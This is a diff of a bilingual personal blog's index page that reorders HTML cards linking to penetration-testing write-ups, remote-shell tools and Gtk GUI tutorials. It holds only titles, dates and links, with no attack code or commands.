+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Jun 2018</time>
+      <time lang="el">23 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Enterprise write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Mar 2018</time>
+      <time lang="el">19 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/shutdown_manager_plain/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shutdown_button.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Creation of a shutdown GUI using Gtk in Python</h3>
+      <h3 class="title" lang="el">Δημιουργία μιας γραφικής διεπαφής κλεισίματος με τη χρήση Gtk σε Python</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">21 Jul 2016</time>
+      <time lang="el">21 Ιουλ 2016</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Unattended write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Aug 2019</time>
+      <time lang="el">23 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -1155,22 +1431,6 @@ if (language) {
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Nineveh write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Dec 2017</time>
-      <time lang="el">17 Δεκ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
@@ -1186,26 +1446,6 @@ if (language) {
           
            
            
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Tally write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 May 2018</time>
-      <time lang="el">03 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1224,20 +1464,44 @@ if (language) {
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Minion write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
+      <h3 class="title" lang="en">Mantis write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">10 Apr 2018</time>
-      <time lang="el">10 Απρ 2018</time>
+      <time lang="en">18 Feb 2018</time>
+      <time lang="el">18 Φεβ 2018</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fortune write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">02 Aug 2019</time>
+      <time lang="el">02 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
            
           
            
@@ -1276,20 +1540,36 @@ if (language) {
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Legacy write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <h3 class="title" lang="en">Reddish write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">19 Oct 2017</time>
-      <time lang="el">19 Οκτ 2017</time>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1300,20 +1580,24 @@ if (language) {
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/shutdown_manager_transparent/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/transparent_shutdown.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Fulcrum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
+      <h3 class="title" lang="en">Creation of a transparent shutdown GUI using Gtk and Cairo in Python</h3>
+      <h3 class="title" lang="el">Δημιουργία μιας διαφανούς γραφικής διεπαφής κλεισίματος με τη χρήση Gtk και Cairo σε Python</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">09 Jun 2018</time>
-      <time lang="el">09 Ιουν 2018</time>
+      <time lang="en">19 Sep 2016</time>
+      <time lang="el">19 Σεπ 2016</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
            
           
            
@@ -1391,205 +1675,21 @@ if (language) {
            
            
            
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Enterprise write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
+      <h3 class="title" lang="en">Minion write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">19 Mar 2018</time>
-      <time lang="el">19 Μαρ 2018</time>
+      <time lang="en">10 Apr 2018</time>
+      <time lang="el">10 Απρ 2018</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Falafel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Jun 2018</time>
-      <time lang="el">23 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Sense write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">24 Mar 2018</time>
-      <time lang="el">24 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Optimum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">28 Oct 2017</time>
-      <time lang="el">28 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Unattended write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Aug 2019</time>
-      <time lang="el">23 Αυγ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -1699,94 +1799,6 @@ if (language) {
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">13 May 2018</time>
-      <time lang="el">13 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/shutdown_manager_plain/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/shutdown_button.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Creation of a shutdown GUI using Gtk in Python</h3>
-      <h3 class="title" lang="el">Δημιουργία μιας γραφικής διεπαφής κλεισίματος με τη χρήση Gtk σε Python</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">21 Jul 2016</time>
-      <time lang="el">21 Ιουλ 2016</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">27 Jul 2019</time>
-      <time lang="el">27 Ιουλ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
           
            
            
@@ -1835,17 +1847,69 @@ if (language) {
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Fortune write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <h3 class="title" lang="en">Tally write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">02 Aug 2019</time>
-      <time lang="el">02 Αυγ 2019</time>
+      <time lang="en">03 May 2018</time>
+      <time lang="el">03 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Nineveh write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">17 Dec 2017</time>
+      <time lang="el">17 Δεκ 2017</time>
     </footer>
   </a>
 </article>
@@ -1907,411 +1971,23 @@ if (language) {
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reddish write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">26 Jan 2019</time>
-      <time lang="el">26 Ιαν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Mantis write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">18 Feb 2018</time>
-      <time lang="el">18 Φεβ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
-      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Apr 2018</time>
-      <time lang="el">22 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
           
            
            
            
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
-      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">13 Apr 2018</time>
-      <time lang="el">13 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
           
            
            
            
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
           
            
            
            
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
           
            
            
            
-           
           
-           
-           
-           
-           
           
            
            
@@ -2377,82 +2053,6 @@ if (language) {
            
            
            
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
-      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Apr 2018</time>
-      <time lang="el">09 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -2775,6 +2375,148 @@ if (language) {
            
            
            
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
+      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Apr 2018</time>
+      <time lang="el">09 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
+      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">22 Apr 2018</time>
+      <time lang="el">22 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/oracle/" class="clearfix">
     <div class="cell">
@@ -2815,6 +2557,282 @@ if (language) {
            
            
            
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
+      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 Apr 2018</time>
+      <time lang="el">13 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
